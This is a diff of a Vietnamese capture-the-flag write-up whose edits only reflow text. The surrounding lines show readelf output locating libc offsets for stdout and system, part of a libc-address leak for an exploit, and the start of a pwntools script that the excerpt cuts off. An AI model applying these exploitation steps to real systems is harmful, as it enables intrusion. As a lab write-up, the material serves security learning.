@@ -176,7 +176,9 @@ root@kali:~# readelf -s /usr/lib32/libc-2.28.so | grep 1dad80
    905: 001dad80   152 OBJECT  GLOBAL DEFAULT   31 _IO_2_1_stdout_@@GLIBC_2.1 # <--- Đúng là offset của hàm rồi :))
 root@kali:~#
 ```
-Rồi thế là biết 1 hàm trong libc. Lưu ý: con này biên dịch bằng `GCC 7.3.0` cho nên việc tính ra địa chỉ `system` có thể bị sai,
+Rồi thế là biết 1 hàm trong libc. 
+
+Lưu ý: con này biên dịch bằng `GCC 7.3.0` cho nên việc tính ra địa chỉ `system` có thể bị sai,
 vì Kali của mình đang chạy `GCC 8.3.0`, chuyển qua Ubuntu cho chắc:
 ```bash
 zeltrax@z-pc:~$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep stdout
@@ -189,7 +191,7 @@ zeltrax@z-pc:~$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
   1510: 0003d200    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0 # <--- Và đây
 zeltrax@z-pc:~$
 ```
-Bài này phải xử lí run-time để leak ra `DWORD PTR [ebp-8]` nên phải code thôi:
+Bài này xử lí run-time để leak ra `DWORD PTR [ebp-8]` nên phải code thôi:
 ```python
 from pwn import *
 
